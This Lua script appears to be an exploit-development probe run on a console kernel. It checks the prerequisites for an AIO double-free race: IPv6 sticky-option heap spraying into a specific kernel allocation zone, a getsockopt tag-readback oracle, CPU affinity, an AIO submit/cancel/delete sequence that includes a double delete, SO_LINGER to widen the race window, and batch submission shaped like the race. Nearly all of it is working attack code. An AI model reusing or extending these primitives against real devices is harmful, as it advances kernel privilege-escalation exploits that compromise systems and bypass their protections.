-- CRASH_CLASS: LOW
-- PROBE 555a: AIO double-free prerequisites — pure recon, no race
--
-- Tests every primitive the aio_multi_delete race needs:
--   A) IPv6 DGRAM socket creation (spray vehicle)
--   B) setsockopt IPV6_DSTOPTS / HOPOPTS (content-controlled 0x80 kernel alloc)
--   C) getsockopt readback (reclaim oracle — can we read our tag back?)
--   D) cpuset_getaffinity (which cores are allowed?)
--   E) AIO full lifecycle: submit(669) → poll(664) → cancel(666) → delete(662)
--   F) SO_LINGER on socketpairs (race window widener)
--   G) Multiple AIO batch submit + batch delete (the actual race shape)

print("=== PROBE 555a: AIO RACE RECON ===")
print("")

-- ======================== HELPERS ========================

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc_socket    = mk(97)
local sc_close     = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_aio_submit = mk(669)
local sc_aio_delete = mk(662)
local sc_aio_poll   = mk(664)
local sc_aio_cancel = mk(666)
local sc_aio_wait   = mk(663)
local sc_getaffinity = mk(487)
local sc_getrlimit  = mk(194)
local sc_setrlimit  = mk(195)

-- ======================== SECTION A: IPv6 SOCKET ========================
print("--- A: IPv6 socket ---")

local AF_INET6  = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41

local ipv6_fd = -1
do
    local ok, v = pcall(function()
        return sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0))
    end)
    if ok then
        ipv6_fd = N(v)
        print("socket(AF_INET6, SOCK_DGRAM) = " .. ipv6_fd)
    else
        print("socket(AF_INET6) THREW: " .. tostring(v))
    end
end

-- Also test SOCK_STREAM and raw
local ipv6_stream = -1
do
    local ok, v = pcall(function()
        return sc_socket(uint64(AF_INET6), uint64(1), uint64(0))
    end)
    if ok then ipv6_stream = N(v); print("socket(AF_INET6, SOCK_STREAM) = " .. ipv6_stream) end
end

-- ======================== SECTION B: setsockopt DSTOPTS / HOPOPTS ========================
print("")
print("--- B: IPv6 sticky options ---")

local IPV6_HOPOPTS = 49
local IPV6_DSTOPTS = 50
local IPV6_RTHDR   = 51

local OPTLEN = 120  -- (14+1)*8 → 0x80 uma zone

local function build_dstopts(buf, optlen, tag)
    -- Zero the buffer
    for i = 0, optlen - 1, 4 do wd(buf + i, 0) end

    -- Header: nxt=0, len=(optlen/8)-1
    -- PadN at [2]: type=1, datalen=optlen-4
    local hdr_len = math.floor(optlen / 8) - 1
    local padn_len = optlen - 4
    -- LE dword: byte0=nxt(0), byte1=hdr_len, byte2=PadN_type(1), byte3=PadN_datalen
    local dw0 = hdr_len * 0x100 + 1 * 0x10000 + padn_len * 0x1000000
    wd(buf, dw0)

    -- Tag at offset 8
    wd(buf + 8, tag)
end

local function build_rthdr(buf, optlen, tag)
    for i = 0, optlen - 1, 4 do wd(buf + i, 0) end
    local hdr_len = math.floor(optlen / 8) - 1
    -- LE: byte0=nxt(0), byte1=hdr_len, byte2=type(0), byte3=segleft(0)
    wd(buf, hdr_len * 0x100)
    wd(buf + 8, tag)
end

local optbuf = memory.alloc(256)
local working_opt = 0

-- Test each option type
local opts_to_test = {
    {name = "IPV6_DSTOPTS",  num = IPV6_DSTOPTS,  builder = build_dstopts},
    {name = "IPV6_HOPOPTS",  num = IPV6_HOPOPTS,  builder = build_dstopts},
    {name = "IPV6_RTHDR",    num = IPV6_RTHDR,     builder = build_rthdr},
}

if ipv6_fd >= 0 then
    for _, opt in ipairs(opts_to_test) do
        opt.builder(optbuf, OPTLEN, 0xDEAD0000)
        local ok, v = pcall(function()
            return sc_setsockopt(uint64(ipv6_fd), uint64(IPPROTO_IPV6),
                uint64(opt.num), uint64(optbuf), uint64(OPTLEN))
        end)
        local ret = ok and N(v) or -999
        print("setsockopt(" .. opt.name .. ", " .. OPTLEN .. "B) = " .. ret)
        if ret >= 0 and working_opt == 0 then
            working_opt = opt.num
            print("  >>> WORKING spray option: " .. opt.name)
        end
    end
else
    print("SKIP: no IPv6 socket")
end

-- ======================== SECTION C: getsockopt READBACK ========================
print("")
print("--- C: getsockopt readback (oracle) ---")

if ipv6_fd >= 0 and working_opt > 0 then
    -- Write a known tag
    build_dstopts(optbuf, OPTLEN, 0xCAFE1234)
    local ok1, v1 = pcall(function()
        return sc_setsockopt(uint64(ipv6_fd), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(optbuf), uint64(OPTLEN))
    end)
    print("setsockopt(tag=0xCAFE1234) = " .. (ok1 and N(v1) or "err"))

    -- Read it back
    local readbuf = memory.alloc(256)
    local lenp = memory.alloc(8)
    wd(lenp, OPTLEN)
    wd(lenp + 4, 0)

    local ok2, v2 = pcall(function()
        return sc_getsockopt(uint64(ipv6_fd), uint64(IPPROTO_IPV6),
            uint64(working_opt), uint64(readbuf), uint64(lenp))
    end)
    local gret = ok2 and N(v2) or -999
    local retlen = rd(lenp)
    local rtag = rd(readbuf + 8)
    print("getsockopt = " .. gret .. " retlen=" .. (retlen or "nil"))
    print("tag readback = 0x" .. string.format("%08X", rtag or 0))

    if rtag == 0xCAFE1234 then
        print(">>> ORACLE CONFIRMED: tag survives round-trip")
    else
        print(">>> ORACLE BROKEN: tag mismatch (got 0x" ..
            string.format("%08X", rtag or 0) .. ")")
    end

    -- Test with a second socket to confirm isolation
    local fd2_ok, fd2_v = pcall(function()
        return sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0))
    end)
    if fd2_ok and N(fd2_v) >= 0 then
        local fd2 = N(fd2_v)
        build_dstopts(optbuf, OPTLEN, 0xBEEF5678)
        pcall(function()
            sc_setsockopt(uint64(fd2), uint64(IPPROTO_IPV6),
                uint64(working_opt), uint64(optbuf), uint64(OPTLEN))
        end)

        -- Read back from fd2
        wd(lenp, OPTLEN)
        local ok3, v3 = pcall(function()
            return sc_getsockopt(uint64(fd2), uint64(IPPROTO_IPV6),
                uint64(working_opt), uint64(readbuf), uint64(lenp))
        end)
        local tag2 = rd(readbuf + 8)
        print("fd2 tag = 0x" .. string.format("%08X", tag2 or 0) ..
            " (expect 0xBEEF5678)")

        -- Read from fd1 again — should still be CAFE1234
        wd(lenp, OPTLEN)
        pcall(function()
            sc_getsockopt(uint64(ipv6_fd), uint64(IPPROTO_IPV6),
                uint64(working_opt), uint64(readbuf), uint64(lenp))
        end)
        local tag1_again = rd(readbuf + 8)
        print("fd1 tag still = 0x" .. string.format("%08X", tag1_again or 0) ..
            " (expect 0xCAFE1234)")

        pcall(function() sc_close(uint64(fd2)) end)
    end
else
    print("SKIP: no working IPv6 opt or no socket")
end

-- ======================== SECTION D: cpuset_getaffinity ========================
print("")
print("--- D: CPU affinity ---")

do
    local mask_buf = memory.alloc(16)
    wd(mask_buf, 0)
    wd(mask_buf + 4, 0)
    -- cpuset_getaffinity(CPU_LEVEL_WHICH=3, CPU_WHICH_TID=1, id=-1, setsize=8, mask)
    local ok, v = pcall(function()
        return sc_getaffinity(uint64(3), uint64(1),
            uint64(string.format("0x%X%08X", 0xFFFFFFFF, 0xFFFFFFFF)),
            uint64(8), uint64(mask_buf))
    end)
    local ret = ok and N(v) or -999
    local lo = rd(mask_buf) or 0
    local hi = rd(mask_buf + 4) or 0
    if lo < 0 then lo = lo + 0x100000000 end
    if hi < 0 then hi = hi + 0x100000000 end
    print("cpuset_getaffinity(487) = " .. ret)
    print("mask = 0x" .. string.format("%08X%08X", hi, lo))

    -- List allowed cores
    local cores = {}
    for i = 0, 63 do
        local word = (i < 32) and lo or hi
        local bit = (i < 32) and i or (i - 32)
        if word and (math.floor(word / (2 ^ bit)) % 2) == 1 then
            cores[#cores + 1] = i
        end
    end
    print("allowed cores: " .. table.concat(cores, ", "))
    print("core count: " .. #cores)
end

-- ======================== SECTION E: AIO LIFECYCLE ========================
print("")
print("--- E: AIO lifecycle ---")

-- Need a blocking fd — socketpair where we don't write
local sv_buf = memory.alloc(16)
local aio_fd = -1
do
    local ok, v = pcall(function()
        return sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv_buf))
    end)
    if ok and N(v) >= 0 then
        aio_fd = rd(sv_buf)
        local aio_fd_peer = rd(sv_buf + 4)
        print("socketpair for AIO: fd=" .. (aio_fd or -1) ..
            " peer=" .. (aio_fd_peer or -1))
    else
        print("socketpair FAILED")
    end
end

if aio_fd and aio_fd >= 0 then
    -- Build SceAioRWRequest (0x28 bytes)
    -- +0x00: offset (int64)
    -- +0x08: nbytes (uint64)
    -- +0x10: buf (void*)
    -- +0x18: unk (void*)
    -- +0x20: fd (int32)
    -- +0x24: _pad (int32)

    local scratch = memory.alloc(0x1000)
    local req = memory.alloc(0x30)
    wq(req + 0x00, uint64(0))          -- offset = 0
    wq(req + 0x08, uint64(0x100))      -- nbytes = 256
    wq(req + 0x10, uint64(scratch))    -- buf
    wq(req + 0x18, uint64(0))          -- unk = 0
    wd(req + 0x20, aio_fd)             -- fd
    wd(req + 0x24, 0)                  -- pad

    local ids = memory.alloc(16)
    wd(ids, 0)
    wd(ids + 4, 0)

    -- SUBMIT: cmd=0x1001 (READ|MULTI), count=1, prio=3
    local ok_sub, v_sub = pcall(function()
        return sc_aio_submit(uint64(0x1001), uint64(req), uint64(1),
            uint64(3), uint64(ids))
    end)
    local sub_ret = ok_sub and N(v_sub) or -999
    local aio_id = rd(ids)
    print("aio_submit(669) = " .. sub_ret .. " id=" .. (aio_id or "nil"))

    if sub_ret >= 0 and aio_id and aio_id > 0 then
        -- POLL
        local states = memory.alloc(16)
        wd(states, 0)
        local ok_poll, v_poll = pcall(function()
            return sc_aio_poll(uint64(ids), uint64(1), uint64(states))
        end)
        local poll_ret = ok_poll and N(v_poll) or -999
        local state = rd(states)
        print("aio_poll(664) = " .. poll_ret .. " state=" .. (state or "nil") ..
            " (1=submitted 2=processing 3=completed 4=aborted)")

        -- CANCEL
        wd(states, 0)
        local ok_can, v_can = pcall(function()
            return sc_aio_cancel(uint64(ids), uint64(1), uint64(states))
        end)
        local can_ret = ok_can and N(v_can) or -999
        local can_state = rd(states)
        print("aio_cancel(666) = " .. can_ret .. " state=" .. (can_state or "nil"))

        -- POLL again after cancel
        wd(states, 0)
        pcall(function()
            sc_aio_poll(uint64(ids), uint64(1), uint64(states))
        end)
        local post_can_state = rd(states)
        print("post-cancel poll state=" .. (post_can_state or "nil") ..
            " (expect 4=aborted)")

        -- DELETE
        local errs = memory.alloc(16)
        wd(errs, 0x99999999)
        local ok_del, v_del = pcall(function()
            return sc_aio_delete(uint64(ids), uint64(1), uint64(errs))
        end)
        local del_ret = ok_del and N(v_del) or -999
        local del_err = rd(errs)
        print("aio_delete(662) = " .. del_ret .. " err=" ..
            string.format("0x%08X", del_err or 0))

        -- DOUBLE DELETE (same id) — should fail with "unknown id"
        wd(errs, 0x99999999)
        local ok_dd, v_dd = pcall(function()
            return sc_aio_delete(uint64(ids), uint64(1), uint64(errs))
        end)
        local dd_ret = ok_dd and N(v_dd) or -999
        local dd_err = rd(errs)
        print("double delete = " .. dd_ret .. " err=" ..
            string.format("0x%08X", dd_err or 0) .. " (expect error)")
    else
        print("AIO submit failed — cannot test lifecycle")
    end
end

-- ======================== SECTION F: SO_LINGER ========================
print("")
print("--- F: SO_LINGER ---")

do
    local sv2 = memory.alloc(16)
    local ok, v = pcall(function()
        return sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv2))
    end)
    if ok and N(v) >= 0 then
        local fd_a = rd(sv2)
        local fd_b = rd(sv2 + 4)
        -- SO_LINGER: {l_onoff=1, l_linger=1} = 8 bytes
        local lg = memory.alloc(8)
        wd(lg, 1)       -- l_onoff = 1
        wd(lg + 4, 1)   -- l_linger = 1 second

        local ok_so, v_so = pcall(function()
            return sc_setsockopt(uint64(fd_a), uint64(0xFFFF), uint64(0x80),
                uint64(lg), uint64(8))
        end)
        print("setsockopt(SO_LINGER) = " .. (ok_so and N(v_so) or "err"))

        -- Verify with getsockopt
        local lg_read = memory.alloc(8)
        local lg_len = memory.alloc(8)
        wd(lg_len, 8)
        pcall(function()
            sc_getsockopt(uint64(fd_a), uint64(0xFFFF), uint64(0x80),
                uint64(lg_read), uint64(lg_len))
        end)
        local l_onoff = rd(lg_read)
        local l_linger = rd(lg_read + 4)
        print("readback: l_onoff=" .. (l_onoff or "nil") ..
            " l_linger=" .. (l_linger or "nil"))

        pcall(function() sc_close(uint64(fd_a)) end)
        pcall(function() sc_close(uint64(fd_b)) end)
    else
        print("socketpair for linger failed")
    end
end

-- ======================== SECTION G: BATCH AIO ========================
print("")
print("--- G: Batch AIO (race shape) ---")

local BATCH = 4

do
    -- Create BATCH socketpairs for AIO fds
    local fds_a = {}
    local fds_b = {}
    local sv3 = memory.alloc(16)
    local ok_batch = true

    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv3))
        end)
        if ok and N(v) >= 0 then
            fds_a[i] = rd(sv3)
            fds_b[i] = rd(sv3 + 4)
        else
            ok_batch = false
            break
        end
    end

    if ok_batch then
        print("socketpairs: " .. BATCH .. " created")

        -- Build request array (BATCH * 0x28 bytes)
        local scratch2 = memory.alloc(0x1000)
        local reqs = memory.alloc(BATCH * 0x30)
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, uint64(0))
            wq(base + 0x08, uint64(0x100))
            wq(base + 0x10, uint64(scratch2))
            wq(base + 0x18, uint64(0))
            wd(base + 0x20, fds_a[i + 1])
            wd(base + 0x24, 0)
        end

        local batch_ids = memory.alloc(BATCH * 4 + 16)
        for i = 0, BATCH - 1 do wd(batch_ids + i * 4, 0) end

        -- SUBMIT batch
        local ok_s, v_s = pcall(function()
            return sc_aio_submit(uint64(0x1001), uint64(reqs), uint64(BATCH),
                uint64(3), uint64(batch_ids))
        end)
        local sret = ok_s and N(v_s) or -999
        print("batch submit(" .. BATCH .. ") = " .. sret)

        local id_strs = {}
        for i = 0, BATCH - 1 do
            id_strs[#id_strs + 1] = tostring(rd(batch_ids + i * 4) or 0)
        end
        print("ids: " .. table.concat(id_strs, ", "))

        -- POLL
        local batch_states = memory.alloc(BATCH * 4 + 16)
        for i = 0, BATCH - 1 do wd(batch_states + i * 4, 0) end
        pcall(function()
            sc_aio_poll(uint64(batch_ids), uint64(BATCH), uint64(batch_states))
        end)
        local state_strs = {}
        for i = 0, BATCH - 1 do
            state_strs[#state_strs + 1] = tostring(rd(batch_states + i * 4) or 0)
        end
        print("states: " .. table.concat(state_strs, ", "))

        -- CANCEL all
        for i = 0, BATCH - 1 do wd(batch_states + i * 4, 0) end
        pcall(function()
            sc_aio_cancel(uint64(batch_ids), uint64(BATCH), uint64(batch_states))
        end)
        local cancel_strs = {}
        for i = 0, BATCH - 1 do
            cancel_strs[#cancel_strs + 1] = tostring(rd(batch_states + i * 4) or 0)
        end
        print("cancel states: " .. table.concat(cancel_strs, ", "))

        -- DELETE all
        local batch_errs = memory.alloc(BATCH * 4 + 16)
        for i = 0, BATCH - 1 do wd(batch_errs + i * 4, 0x99999999) end
        local ok_d, v_d = pcall(function()
            return sc_aio_delete(uint64(batch_ids), uint64(BATCH), uint64(batch_errs))
        end)
        local dret = ok_d and N(v_d) or -999
        local err_strs = {}
        for i = 0, BATCH - 1 do
            local e = rd(batch_errs + i * 4)
            err_strs[#err_strs + 1] = string.format("0x%08X", e or 0)
        end
        print("batch delete = " .. dret .. " errs: " .. table.concat(err_strs, ", "))

        -- Cleanup
        for i = 1, BATCH do
            pcall(function() sc_close(uint64(fds_a[i])) end)
            pcall(function() sc_close(uint64(fds_b[i])) end)
        end
    else
        print("failed to create all socketpairs")
    end
end

-- ======================== SECTION H: fd limit ========================
print("")
print("--- H: fd limit ---")

do
    local rl = memory.alloc(16)
    local ok, v = pcall(function()
        return sc_getrlimit(uint64(8), uint64(rl))  -- RLIMIT_NOFILE=8
    end)
    local ret = ok and N(v) or -999
    local cur_lo = rd(rl)
    local cur_hi = rd(rl + 4)
    local max_lo = rd(rl + 8)
    local max_hi = rd(rl + 12)
    print("getrlimit(NOFILE) = " .. ret)
    print("  cur=" .. (cur_lo or "?") .. " max=" .. (max_lo or "?"))

    -- Try raising cur to max
    if max_lo and max_lo > 0 then
        wq(rl, uint64(max_lo))
        wq(rl + 8, uint64(max_lo))
        local ok2, v2 = pcall(function()
            return sc_setrlimit(uint64(8), uint64(rl))
        end)
        print("setrlimit(cur=max=" .. max_lo .. ") = " .. (ok2 and N(v2) or "err"))
    end
end

-- ======================== SUMMARY ========================
print("")
print("=== SUMMARY ===")
print("IPv6 DGRAM socket: " .. (ipv6_fd >= 0 and "YES fd=" .. ipv6_fd or "NO"))
print("IPv6 STREAM socket: " .. (ipv6_stream >= 0 and "YES" or "NO"))
print("Spray option: " .. (working_opt > 0 and
    ({[49]="HOPOPTS",[50]="DSTOPTS",[51]="RTHDR"})[working_opt] or "NONE"))
print("Oracle readback: check above")

-- Cleanup
if ipv6_fd >= 0 then pcall(function() sc_close(uint64(ipv6_fd)) end) end
if ipv6_stream >= 0 then pcall(function() sc_close(uint64(ipv6_stream)) end) end

print("")
print("ALIVE")
